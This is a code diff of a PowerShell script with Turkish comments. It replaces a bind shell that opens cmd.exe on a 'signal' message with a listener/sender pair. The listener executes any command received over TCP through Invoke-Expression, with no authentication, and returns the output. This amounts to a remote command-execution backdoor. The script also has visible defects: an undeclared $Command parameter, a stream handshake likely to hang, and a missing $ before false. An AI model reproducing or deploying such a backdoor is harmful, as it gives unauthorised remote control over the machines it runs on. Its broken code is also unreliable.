@@ -1,55 +1,82 @@
-function GPT5
-{
+[CmdletBinding()]
+param (
+    [Parameter(Mandatory=$true)]
+    [string]$Mode,
+    [Parameter(Mandatory=$false)]
+    [string]$IP,
+    [Parameter(Mandatory=$false)]
+    [int]$Port
+)
+
+function GPT4-Listener {
     [CmdletBinding()]
     param(
-        [Parameter(Mandatory=$True, Position=1)]
-        [string]$IPAddress,
-
-        [Parameter(Mandatory=$True, Position=2)]
+        [Parameter(Mandatory=$True)]
         [int]$Port
     )
-
+    
     # Listener'ı başlatıyoruz.
     $listener = New-Object System.Net.Sockets.TcpListener([IPAddress]::Any, $Port)
     $listener.Start()
+    
+    # Bağlantı bekliyoruz.
+    Write-Host "Dinlemede..."
+    $client = $listener.AcceptTcpClient()
+    $stream = $client.GetStream()
+    
+    # Komutları işletiyoruz.
+    $reader = New-Object System.IO.StreamReader($stream)
+    $command = $reader.ReadToEnd()
+    Write-Host "Komut: $command"
+    $output = Invoke-Expression $command
+    $writer = New-Object System.IO.StreamWriter($stream)
+    $writer.Write($output)
+    $writer.Flush()
+    
+    # Bağlantıyı kapatıyoruz.
+    $client.Close()
+    $listener.Stop()
+}
 
-    while ($true)
-    {
-        # İstemciyi kabul ediyoruz.
-        $client = $listener.AcceptTcpClient()
+function GPT4-Sender {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory=$True)]
+        [string]$IPAddress,
 
-        # Gelen veriyi okuyoruz.
-        $stream = $client.GetStream()
-        $reader = New-Object System.IO.StreamReader($stream)
-        $data = $reader.ReadToEnd()
+        [Parameter(Mandatory=$True)]
+        [int]$Port,
 
-        # Sinyal geldiğinde cmd.exe'yi açıyoruz.
-        if ($data -eq "signal")
-        {
-            $process = New-Object System.Diagnostics.Process
-            $process.StartInfo.FileName = "cmd.exe"
-            $process.StartInfo.RedirectStandardInput = $true
-            $process.StartInfo.RedirectStandardOutput = $true
-            $process.StartInfo.UseShellExecute = false
-            $process.Start()
+        [Parameter(Mandatory=$True)]
+        [string]$Command
+    )
 
-            $writer = $process.StandardInput
-            $reader = $process.StandardOutput
+    # Bağlantıyı açıyoruz.
+    $client = New-Object System.Net.Sockets.TcpClient($IPAddress, $Port)
+    $stream = $client.GetStream()
 
-            # İstemci ile iletişime geçiyoruz.
-            while ($process.HasExited -eq $false)
-            {
-                $line = $reader.ReadLine()
-                if ($line -ne $null)
-                {
-                    $writer.WriteLine($line)
-                    $writer.Flush()
-                }
+    # Komut gönderiyoruz.
+    $writer = New-Object System.IO.StreamWriter($stream)
+    $writer.Write($Command)
+    $writer.Flush()
 
-                Start-Sleep -Milliseconds 100
-            }
-        }
+    # Cevabı okuyoruz.
+    $reader = New-Object System.IO.StreamReader($stream)
+    $response = $reader.ReadToEnd()
 
-        $client.Close()
-    }
+    # Bağlantıyı kapatıyoruz.
+    $client.Close()
+
+    # Cevabı yazdırıyoruz.
+    Write-Host $response
+}
+
+if ($Mode -eq "listener") {
+    GPT4-Listener -Port $Port
+}
+elseif ($Mode -eq "sender") {
+    GPT4-Sender -IPAddress $IP -Port $Port -Command $Command
+}
+else {
+    Write-Host "Kullanım: GPT4 -Mode <listener|sender> [-IP <IP Adresi>] [-Port <Port Numarası>] [-Command <Komut>]"
 }
